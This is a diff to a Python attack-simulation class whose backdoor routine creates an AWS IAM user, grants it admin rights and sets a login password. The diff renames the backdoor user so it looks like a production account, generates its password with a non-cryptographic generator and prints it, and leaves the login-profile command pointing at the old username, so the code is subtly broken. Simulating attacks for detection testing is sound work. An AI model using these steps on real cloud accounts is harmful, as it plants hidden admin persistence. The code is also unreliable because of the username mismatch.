@@ -1,4 +1,6 @@
 import os
+import string
+import random
 import shlex
 import sys
 import re
@@ -177,7 +179,7 @@ class ScenarioExecution:
 
     def attempt_backdoor(self):
         # Create new user
-        error_code = self.attacker_run("aws iam create-user --user-name test-user-demo8")
+        error_code = self.attacker_run("aws iam create-user --user-name prod-system-backup-user")
         if error_code != 0:
             print(colored("Failed to create new IAM user", "red"))
             return False
@@ -190,9 +192,13 @@ class ScenarioExecution:
             print(colored("Failed to attach admin policy to new IAM user", "red"))
             return False
 
-        # Create password/key for user
+        # Create password for user
+        password_charset = string.ascii_letters + string.digits
+        generated_password = ''.join(random.choices(password_charset, k=12))
+        print(colored(f"Generated password for backdoor user: {generated_password}", "red"))
+
         error_code = self.attacker_run(
-            "aws iam create-login-profile --user-name test-user-demo8 --password VerySecure123@")
+            f"aws iam create-login-profile --user-name test-user-demo8 --password {generated_password}")
         if error_code != 0:
             print(colored("Failed to create login profile for new IAM user", "red"))
             return False
